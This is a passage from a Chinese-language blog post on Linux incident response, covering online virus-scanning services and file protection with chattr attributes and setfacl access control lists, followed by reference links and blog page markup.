<h1 id="0x10-病毒检测"><a href="#0x10-病毒检测" class="headerlink" title="0x10 病毒检测"></a>0x10 病毒检测</h1><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">https://x.threatbook.cn/</span><br><span class="line">http://www.virscan.org</span><br><span class="line">https://www.virustotal.com/</span><br><span class="line">https://fireeye.ijinshan.com/</span><br></pre></td></tr></table></figure>

<h1 id="0x11-文件权限"><a href="#0x11-文件权限" class="headerlink" title="0x11 文件权限"></a>0x11 文件权限</h1><p>一般是使用chattr或者setfacl来设置权限。</p>
<p>chattr可以修改属性能够提高系统的安全性，但是它并不适合所有的目录。chattr命令不能保护/、/dev、/tmp、/var目录，常用参数如下：</p>
<figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">a：即append，设定该参数后，只能向文件中添加数据，而不能删除，多用于服务器日志文件安全，只有root才能设定这个属性。</span><br><span class="line"></span><br><span class="line"><span class="built_in">i</span>：设定文件不能被删除、改名、设定链接关系，同时不能写入或新增内容。<span class="built_in">i</span>参数对于文件 系统的安全设置有很大帮助。</span><br><span class="line"></span><br><span class="line">s：保密性地删除文件或目录，即硬盘空间被全部收回。</span><br><span class="line"></span><br><span class="line">u：与s相反，当设定为u时，数据内容其实还存在磁盘中，可以用于undeletion。</span><br></pre></td></tr></table></figure>

<p>例子：</p>
<p>设置/etc/resolv.conf为不可修改</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[root@vincent tmp]# chattr +i /etc/resolv.conf</span><br><span class="line"></span><br><span class="line">[root@vincent tmp]# lsattr /etc/resolv.conf</span><br><span class="line"></span><br><span class="line">----i--------e- /etc/resolv.conf</span><br><span class="line"></span><br><span class="line">[root@vincent tmp]# echo "" &gt; /etc/resolv.conf</span><br><span class="line"></span><br><span class="line">-bash: /etc/resolv.conf: 权限不够</span><br></pre></td></tr></table></figure>

<p>可以使用lsattr查看文件权限</p>
<p>setfacl其实是设置文件的访问控制列表，传统的 Linux 文件系统的权限控制是通过 user、group、other 与 r(读)、w(写)、x(执行) 的不同组合来实现的，同时存在不灵活的问题， 例如目录 /data 的权限为：drwxr-x—，所有者与所属组均为 root，在不改变所有者的前提下，要求用户 tom 对该目录有完全访问权限 (rwx).考虑以下2种办法 (这里假设 tom 不属于 root group)</p>
<p>(1) 给 /data 的 other 类别增加 rwx permission，这样由于 tom 会被归为 other 类别，那么他也将拥有 rwx 权限。</p>
<p>(2) 将 tom 加入到 root group，为 root group 分配 rwx 权限，那么他也将拥有 rwx 权限。</p>
<p>以上 2 种方法其实都不合适，为了解决这些问题，Linux 开发出了一套新的文件系统权限管理方法，叫文件访问控制列表 (Access Control Lists, ACL)。简单地来说，ACL 就是可以设置特定用户或者用户组对于一个文件的操作权限。文件的所有者以及有CAP_FOWNER（在目前的linux系统上，root用户是唯一有CAP_FOWNER能力的用户）的用户进程可以设置一个文件的acl。ACL 有两种，一种是access ACL，针对文件和目录设置访问控制列表。一种是default ACL，只能针对目录设置。如果目录中的文件没有设置 ACL，它就会使用该目录的默认 ACL.</p>
<p>getfacl获取文件权限</p>
<p>setfacl设置Access ACL</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">setfacl -m u:root:rwx &#123;file&#125;</span><br><span class="line"><span class="meta">#</span><span class="bash">取消ACL</span></span><br><span class="line">setfacl -b &#123;file&#125;</span><br></pre></td></tr></table></figure>

<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="http://vinc.top/2017/09/20/linux%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%A7%BF%E5%8A%BF/" target="_blank" rel="noopener">http://vinc.top/2017/09/20/linux%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%A7%BF%E5%8A%BF/</a></p>
<p><a href="https://mp.weixin.qq.com/s/ZUJ87wWbzccw_zSRADfCVg" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/ZUJ87wWbzccw_zSRADfCVg</a></p>
<p><a href="https://mp.weixin.qq.com/s/xodT25Pn3fW1xHrU0IhBDQ" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/xodT25Pn3fW1xHrU0IhBDQ</a></p>
<p><a href="https://mp.weixin.qq.com/s/Z0kBcwy379x_J-Xm2Y-Vlg" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/Z0kBcwy379x_J-Xm2Y-Vlg</a></p>
<p><a href="https://www.xsec.io/2018/8/31/emergency-response.html" target="_blank" rel="noopener">https://www.xsec.io/2018/8/31/emergency-response.html</a></p>
<p><a href="https://www.freebuf.com/articles/network/186071.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/network/186071.html</a></p>
<p><a href="https://github.com/iamckn/backdoors" target="_blank" rel="noopener">https://github.com/iamckn/backdoors</a></p>
<p><a href="https://mp.weixin.qq.com/s/1I0MpWXcyJoe5zGFLnv8gw" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/1I0MpWXcyJoe5zGFLnv8gw</a></p>
<p><a href="https://mp.weixin.qq.com/s/-T9wupsSfW1Q73ocPgvMBg" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/-T9wupsSfW1Q73ocPgvMBg</a></p>
<p><a href="https://mp.weixin.qq.com/s/s0Rvlzrwx6uW_Po5AcusnQ" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/s0Rvlzrwx6uW_Po5AcusnQ</a></p>
<p><a href="https://mp.weixin.qq.com/s/tu3c0l_2Bu4kNGqp3tlxKw" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/tu3c0l_2Bu4kNGqp3tlxKw</a></p>

      
    </div>

    

    
    
    

    
<div>
  
    <div>
    
        <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束<i class="fa fa-heart"></i>感谢阅读-------------</div>
    
</div>
  
</div>
    

    

    <footer class="post-footer">
      

      
      
      

      
        <div class="post-nav">
          <div class="post-nav-next post-nav-item">
            
              <a href="/2019/05/09/任意用户密码重置/" rel="prev" title="任意用户密码重置">
                <i class="fa fa-chevron-left"></i> 任意用户密码重置
              </a>
            
          </div>

          <span class="post-nav-divider"></span>

          <div class="post-nav-prev post-nav-item">
            
              <a href="/2019/04/10/MetInfos实战/" rel="next" title="MetInfos实战">
                MetInfos实战 <i class="fa fa-chevron-right"></i>
              </a>
            
          </div>
        </div>
      

      
      
    </footer>
  </div>
  
  
  
  </article>


  </div>


          </div>
          

  



        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
      <div id="sidebar-dimmer"></div>
    
    <div class="sidebar-inner">

      

      
        <ul class="sidebar-nav motion-element">
          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
            Table of Contents
          </li>
          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
            Overview
          </li>
        </ul>
      

      <section class="site-overview-wrap sidebar-panel">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <a href="/">
                <img class="site-author-image" itemprop="image" src="/images/jack.jpg" alt="嘤嘤怪er">
              </a>
            
              <p class="site-author-name" itemprop="name">嘤嘤怪er</p>
              <p class="site-description motion-element" itemprop="description">0menc</p>
          </div>

          
            <nav class="site-state motion-element">
              
                <div class="site-state-item site-state-posts">
                
                  <a href="/archives/">
                
                    <span class="site-state-item-count">101</span>
                    <span class="site-state-item-name">posts</span>
                  </a>
                </div>
              

              
                
                
                <div class="site-state-item site-state-categories">
                  <a href="/categories/index.html">
                    
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                    <span class="site-state-item-count">16</span>
                    <span class="site-state-item-name">categories</span>
                  </a>
                </div>
              

              
                
                
                <div class="site-state-item site-state-tags">
                  <a href="/tags/index.html">
                    
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                    <span class="site-state-item-count">17</span>
                    <span class="site-state-item-name">tags</span>
                  </a>
                </div>
              
            </nav>
          

          

          

          
          

          
          

          
            
          
          

        </div>
      </section>

      
      <!--noindex-->
        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
          <div class="post-toc">

            
              
            

            
              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#0x01-Web服务"><span class="nav-number">1.</span> <span class="nav-text">0x01 Web服务</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x02-SSH服务"><span class="nav-number">2.</span> <span class="nav-text">0x02 SSH服务</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x03-进程"><span class="nav-number">3.</span> <span class="nav-text">0x03 进程</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x04-网络连接"><span class="nav-number">4.</span> <span class="nav-text">0x04 网络连接</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x05-敏感目录"><span class="nav-number">5.</span> <span class="nav-text">0x05 敏感目录</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x06-history"><span class="nav-number">6.</span> <span class="nav-text">0x06 history</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x07-开机启动"><span class="nav-number">7.</span> <span class="nav-text">0x07 开机启动</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x08-定时任务"><span class="nav-number">8.</span> <span class="nav-text">0x08 定时任务</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x09-Rootkit"><span class="nav-number">9.</span> <span class="nav-text">0x09  Rootkit</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x10-病毒检测"><span class="nav-number">10.</span> <span class="nav-text">0x10 病毒检测</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x11-文件权限"><span class="nav-number">11.</span> <span class="nav-text">0x11 文件权限</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#参考链接"><span class="nav-number">12.</span> <span class="nav-text">参考链接</span></a></li></ol></div>
            

          </div>
        </section>
      <!--/noindex-->
      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; 2018 – <span itemprop="copyrightYear">2019</span>
  <span class="with-love" id="animate">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">嘤嘤怪er</span>

  

  
</div>











        








        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
          <span id="scrollpercent"><span>0</span>%</span>
        
      </div>
    

    
	
    

    
  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>


























  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=6.4.1"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=6.4.1"></script>



  
  

  
  <script type="text/javascript" src="/js/src/scrollspy.js?v=6.4.1"></script>
<script type="text/javascript" src="/js/src/post-details.js?v=6.4.1"></script>



  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=6.4.1"></script>



  



  










  





  

  

  

  

  
  

  

  

  

  

  


<script type="text/javascript">

    var a_idx = 0;
    jQuery(document).ready(function($) {
        $("body").click(function(e) {
            var a = new Array("富强", "民主", "文明", "和谐", "自由", "平等", "公正" ,"法治", "爱国", "敬业", "诚信", "友善");
            var $i = $("<span />").text(a[a_idx]);
            a_idx = (a_idx + 1) % a.length;
            var x = e.pageX,
                y = e.pageY;
            $i.css({
                "z-index": 99999999999999999999999999999999999999999999999999999999999999999999999999 ,
                "top": y - 20,
                "left": x,
                "position": "absolute",
                "font-weight": "bold",
                "color": "#ff6651"
            });
            $("body").append($i);
            $i.animate({
                    "top": y - 180,
                    "opacity": 0
                },
                1500,
                function() {
                    $i.remove();
                });
        });
    });
</script>
<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginModelPath":"assets/","model":{"jsonPath":"/live2dw/assets/hijiki.model.json"},"display":{"position":"right","width":150,"height":300,"bottom":-40},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
</html>
